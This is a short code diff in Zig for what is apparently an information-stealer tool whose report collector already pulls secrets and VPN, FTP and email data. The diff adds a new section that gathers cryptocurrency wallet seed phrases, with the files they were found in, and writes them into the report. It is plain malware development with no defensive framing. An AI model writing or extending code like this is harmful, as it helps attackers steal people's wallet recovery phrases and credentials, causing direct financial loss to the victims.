@@ -13,6 +13,7 @@ const regex_grabber = @import("regex_grabber.zig");
 const vpn = @import("../vpn/vpn.zig");
 const ftp = @import("../ftp/ftp.zig");
 const email = @import("../email/email.zig");
+const seed_grabber = @import("seed_grabber.zig");
 
 pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     var report = std.ArrayList(u8).init(allocator);
@@ -143,6 +144,26 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
             }
         } else {
             try w.print("No secrets found\n", .{});
+        }
+    }
+
+    try w.print("=== Seed Phrases ===\n", .{});
+    {
+        const sr = seed_grabber.collect(allocator) catch blk: {
+            break :blk seed_grabber.SeedResult{ .files = &.{}, .phrases = &.{} };
+        };
+        defer {
+            for (sr.files) |f| allocator.free(f);
+            allocator.free(sr.files);
+            for (sr.phrases) |p| allocator.free(p);
+            allocator.free(sr.phrases);
+        }
+        if (sr.files.len > 0) {
+            for (sr.files, sr.phrases) |f, p| {
+                try w.print("{s}: {s}\n", .{ f, p });
+            }
+        } else {
+            try w.print("No seed phrases found\n", .{});
         }
     }
 
